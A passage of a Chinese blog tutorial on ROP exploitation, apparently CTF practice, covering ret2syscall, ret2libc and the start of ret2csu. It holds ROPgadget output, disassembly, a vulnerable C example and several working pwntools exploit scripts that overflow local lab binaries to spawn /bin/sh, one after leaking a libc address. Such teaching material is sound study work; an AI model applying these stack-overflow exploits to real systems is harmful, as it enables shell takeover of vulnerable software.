<ol type="1">
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）;</li>
</ol>
</blockquote>
<p>关于Linux系统调用号, 请到<a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">这里</a>查看. 我们能查到<code>execve</code>的系统调用号为<code>0x0b</code>, 如下图:</p>
<div style="text-align: center;">
<figure>
<img src="/2019/06/06/1.2-菜鸟学PWN之ROP学习/Selection_034.png" alt="execve系统调用号"><figcaption>execve系统调用号</figcaption>
</figure>
</div>
<p>可知, 有三个参数, 分别对应<code>ebx</code>, <code>ecx</code>, <code>edx</code>. 我们需要使得:</p>
<blockquote>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
</blockquote></li>
<li><p>那我们如何控制这些寄存器的值呢? 这里就需要我们使用gadgets. 比如当前栈帧的栈顶是<code>0x20</code>那么我们<code>pop eax</code>即可改变<code>eax</code>的值为<code>0x20</code>. 但是很少有一段gadgets里连续pop以上四个寄存器, 所以我们需要跳转到几个gadgets, 这就是rop技术的真正实现.</p>
<ol type="1">
<li>我们先寻找一下<code>pop eax | ret</code>:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep &apos;eax&apos;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
<p>可看到有好几段, 这里我们选择<code>0x080bb196</code>来作为第一段跳板.</p>
<ol start="2" type="1">
<li>接下来我们再看看<code>ebx</code>:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep &apos;ebx&apos;      </span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
<p>这里有很多个<code>pop ebx</code>的gadgets, 但是在<code>0x0806eb90</code>中, 三个pop操作分别是对<code>edx ecx ebx</code>, 这个gadgets便能满足<code>execve</code>的三个参数所需的寄存器. 因此我们选择这一段.</p>
<ol start="3" type="1">
<li>然后我们再看一下是否有<code>/bin/sh</code>字符串在程序里：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2syscall --string &quot;/bin/sh&quot;           </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
<p>可看到在<code>0x080be408</code>含有该字符串.</p>
<ol start="4" type="1">
<li>最后我们还需要触发0x80号中断, 因此还要找到该中断对应的地址:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &apos;int&apos;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure></li>
<li><p>上面步骤的四个小步骤已经帮我们找到了所需的4段gadgets, 接下来我们payload直接使用这些gadgets即可:</p>
<blockquote>
<p>payload = (gadget1_pop_syscall_eax + value) + (gadget2_pop_other_register + value) + (gadget3_int_address)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">ret_offset = <span class="number">0xffffcfb8</span> - (<span class="number">0xffffcf30</span> + <span class="number">0x1c</span>) + <span class="number">0x04</span></span><br><span class="line"><span class="keyword">print</span> ret_offset</span><br><span class="line">sh_addr = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">flat() Parameters:</span></span><br><span class="line"><span class="string">args – Values to flatten</span></span><br><span class="line"><span class="string">preprocessor (function) – Gets called on every element to optionally transform the element before flattening. If None is returned, then the original value is uded.</span></span><br><span class="line"><span class="string">word_size (int) – Word size of the converted integer (in bits).</span></span><br><span class="line"><span class="string">endianness (str) – Endianness of the converted integer (“little”/”big”).</span></span><br><span class="line"><span class="string">sign (str) – Signedness of the converted integer (False/True)</span></span><br><span class="line"><span class="string">即: flat()函数将数组每项以大端/小端,有/无符号,将每项合并.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span>*ret_offset, pop_eax_addr, <span class="number">0x0b</span>, pop_edx_ecx_ebx_addr, <span class="number">0</span>, <span class="number">0</span>, sh_addr, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="x24-ret2libc">0x24 ret2libc</h3>
<p>ret2libc顾名思义即控制程序执行libc中的函数, 通常是返回某个函数的plt或者函数的具体位置. 为了get shell, 我们会执行<code>system('/bin/sh')</code>. 这里需要注意的一点是: <strong>在leak libc中的部分函数地址之后, 我们需要根据对应的libc版本去查找相应的函数偏移.</strong></p>
<h4 id="存在system函数及binsh情况">① 存在system函数及/bin/sh情况</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ret2libc1'</span>)</span><br><span class="line"></span><br><span class="line">ret_offset = <span class="number">112</span></span><br><span class="line"><span class="comment"># /bin/sh字符串地址</span></span><br><span class="line">shell_addr = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment"># system函数地址</span></span><br><span class="line">system_addr = <span class="number">0x08048460</span></span><br><span class="line"><span class="comment"># 这里addr是随便填写的, 作为函数的返回地址, 具体情况上一篇博客的栈帧结构.</span></span><br><span class="line">payload = flat([<span class="string">"a"</span>*ret_offset, system_addr, <span class="string">"addr"</span>, shell_addr])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'addr' 作为虚假的地址，其后参数对应的参数内容。</p>
<h4 id="只存在system函数的情况">② 只存在system函数的情况</h4>
<ol type="1">
<li><p>bss段的buf2如下: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br></pre></td></tr></table></figure></p></li>
<li><p>pop ebx: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ROPgadget --binary ret2libc2 --only &apos;pop|ret&apos; | grep &apos;ebx&apos;</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure></p></li>
</ol>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *--</span><br><span class="line">sh = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line"></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">ret_offset = <span class="number">112</span></span><br><span class="line">system_addr = <span class="number">0x08048490</span></span><br><span class="line">gets_addr = <span class="number">0x08048460</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line"><span class="comment"># 这里如ret2syscall中,先查找能够使用的gadgets, 然后向程序的bss段中的buf2中写入/bin/sh字符串,并将其地址作为system函数的参数传入.</span></span><br><span class="line"><span class="comment"># 跳转的顺序依次是: ①gets函数ret --&gt; ②pop ebx; ret buf2_addr --&gt; ③system函数 + buf2_addr</span></span><br><span class="line">payload = flat([<span class="string">"a"</span>*ret_offset, gets_addr, pop_ebx_addr, buf2_addr, system_addr, <span class="string">"addr"</span>, buf2_addr])                          </span><br><span class="line"><span class="comment"># gets(buf2);</span></span><br><span class="line"><span class="comment"># system('/bin/sh');</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<h4 id="system函数和binsh都不存在的情况">③ system函数和/bin/sh都不存在的情况</h4>
<blockquote>
<p>获取system函数的地址:</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，<strong>最低的 12 位(低3位16进制)</strong>并不会发生改变。而 libc 在 github 上有人进行收集.</li>
<li>https://github.com/niklasb/libc-database</li>
</ul>
</blockquote>
<p><strong>由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
<h5 id="ret2libc漏洞利用的基本思路">※ ret2libc漏洞利用的基本思路</h5>
<blockquote>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">===========================================================================</span><br><span class="line">.got.plt:0804A000</span><br><span class="line">.got.plt:0804A000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0804A000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0804A000 _got_plt        segment dword public &apos;DATA&apos; use32</span><br><span class="line">.got.plt:0804A000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0804A000                 ;org 804A000h</span><br><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048420↑r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048420+6↑r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset gets          ; DATA XREF: _gets↑r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset time          ; DATA XREF: _time↑r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset __gmon_start__</span><br><span class="line">.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__↑r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset srand         ; DATA XREF: _srand↑r</span><br><span class="line">.got.plt:0804A024 off_804A024     dd offset __libc_start_main 0804A024</span><br><span class="line">.got.plt:0804A024                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:0804A02C off_804A02C     dd offset rand          ; DATA XREF: _rand↑r</span><br><span class="line">.got.plt:0804A030 off_804A030     dd offset __isoc99_scanf</span><br><span class="line">.got.plt:0804A030                                         ; DATA XREF: ___isoc99_scanf↑r</span><br><span class="line">.got.plt:0804A030 _got_plt        ends</span><br><span class="line">.got.plt:0804A030</span><br><span class="line">.data:0804A034 ; ===========================================================================</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"><span class="comment"># 获取plt中puts的地址</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># 获取got表中的libc</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment"># print "libc_start_main_go:",hex(libc_start_main_got)</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment"># print "main:",hex(main)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="comment"># libc_start_main_addr = 0xf7d20d90</span></span><br><span class="line"><span class="comment"># print "leak libc start main addr: ", hex(libc_start_main_addr)</span></span><br><span class="line"><span class="comment"># print 'normal libc start main addr: ', hex(0xf7d20d90)</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher('__libc_start_main', libc_start_main_addr)</span></span><br><span class="line"><span class="comment"># libcbase = libc_start_main_addr - libc.dump('__libc_start_main')</span></span><br><span class="line"><span class="comment"># binsh_offset = 0x0017b8cf - 0x00018d90</span></span><br><span class="line"><span class="comment"># system_offset = 0x0003cd10 - 0x00018d90</span></span><br><span class="line"><span class="comment"># system_addr = libcbase + libc.dump('system')</span></span><br><span class="line"><span class="comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span></span><br><span class="line"></span><br><span class="line">system_offset = <span class="number">0x24470</span></span><br><span class="line">binsh_offset = <span class="number">0x16533f</span></span><br><span class="line">system_addr = system_offset + libc_start_main_addr</span><br><span class="line">binsh_addr = binsh_offset + libc_start_main_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="x30-中级rop">0x30 中级ROP</h2>
<h3 id="x31-ret2csu">0x31 ret2csu</h3>
<h4 id="使用原理">① 使用原理</h4>
<p>在64位程序中, 函数调用的前六个参数是通过寄存器传参的(<code>rdi, rsi, rdx, rcx, r8, r9</code>), 其余的参数才是通过压栈的形式传参. 但是一般在程序中很少有连续的这么多pop寄存器的gadgets, 这时候就需要利用到libc的初始化函数:<code>__libc_csu_init</code>, 这个函数只要调用了libc就有, 而大部分程序都会调用libc, 所以这个函数在绝大部分程序中都会出现. 函数的二进制形式如下:(不同libc版本大致相同)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005A0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005A0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 var_30          = qword ptr -30h</span><br><span class="line">.text:00000000004005A0 var_28          = qword ptr -28h</span><br><span class="line">.text:00000000004005A0 var_20          = qword ptr -20h</span><br><span class="line">.text:00000000004005A0 var_18          = qword ptr -18h</span><br><span class="line">.text:00000000004005A0 var_10          = qword ptr -10h</span><br><span class="line">.text:00000000004005A0 var_8           = qword ptr -8</span><br><span class="line">.text:00000000004005A0</span><br><span class="line">.text:00000000004005A0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005A0                 mov     [rsp+var_28], rbp</span><br><span class="line">.text:00000000004005A5                 mov     [rsp+var_20], r12</span><br><span class="line">.text:00000000004005AA                 lea     rbp, cs:600E24h</span><br><span class="line">.text:00000000004005B1                 lea     r12, cs:600E24h</span><br><span class="line">.text:00000000004005B8                 mov     [rsp+var_18], r13</span><br><span class="line">.text:00000000004005BD                 mov     [rsp+var_10], r14</span><br><span class="line">.text:00000000004005C2                 mov     [rsp+var_8], r15</span><br><span class="line">.text:00000000004005C7                 mov     [rsp+var_30], rbx</span><br><span class="line">.text:00000000004005CC                 sub     rsp, 38h</span><br><span class="line">.text:00000000004005D0                 sub     rbp, r12</span><br><span class="line">.text:00000000004005D3                 mov     r13d, edi</span><br><span class="line">.text:00000000004005D6                 mov     r14, rsi</span><br><span class="line">.text:00000000004005D9                 sar     rbp, 3</span><br><span class="line">.text:00000000004005DD                 mov     r15, rdx</span><br><span class="line">.text:00000000004005E0                 call    _init_proc</span><br><span class="line">.text:00000000004005E5                 test    rbp, rbp</span><br><span class="line">.text:00000000004005E8                 jz      short loc_400606</span><br><span class="line">.text:00000000004005EA                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005EC                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:00000000004005F0</span><br><span class="line">.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j</span><br><span class="line">.text:00000000004005F0                 mov     rdx, r15</span><br><span class="line">.text:00000000004005F3                 mov     rsi, r14</span><br><span class="line">.text:00000000004005F6                 mov     edi, r13d</span><br><span class="line">.text:00000000004005F9                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:00000000004005FD                 add     rbx, 1</span><br><span class="line">.text:0000000000400601                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400604                 jnz     short loc_4005F0</span><br><span class="line">.text:0000000000400606</span><br><span class="line">.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">.text:0000000000400628 ; &#125; // starts at 4005A0</span><br><span class="line">.text:0000000000400628 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们主要利用顺序如下:</p>
<ol type="1">
<li><code>0x0000000000400606~0000000000400628</code>, (利用栈溢出构造栈上数据)依次修改<code>rbx, rbp, r12, r13, r14, r15</code>六个寄存器的值.(这里需要注意的是rsp是栈顶指针, 可能不是从rsp开始压入rbx, 上面的<code>var_30</code>就是从<code>rsp+8</code>开始压栈的, 所以写payload的时候需要加上一个<code>p64(0)</code>)</li>
<li>上面修改的寄存器的值是为接下来的<code>0x00000000004005F0~0x0000000000400604</code>这段代码服务的, 我们通过修改<code>rdx, rsi, edi</code>的值来当做下一步<code>call qword ptr [r12+rbx*8]</code>的参数, 这样只要我们把rbx设为0, 把r12的值设为我们想要跳转到函数的got地址即可.</li>
<li><code>0x000000000040060D~0x0000000000400614</code>, 我们为了不让它循环(往下执行), 而在上面已经把rbx设为0, 因此需要在第1步把rbp的值设为1</li>
</ol>
</blockquote>
<h4 id="使用情形">② 使用情形</h4>
<blockquote>
<ol type="1">
<li>程序中pop参数的gadgets比较少, 或者不是连续的;</li>
<li>存在栈溢出</li>
</ol>
</blockquote>
<h4 id="使用例题">③ 使用例题</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">true<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">trueread(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span 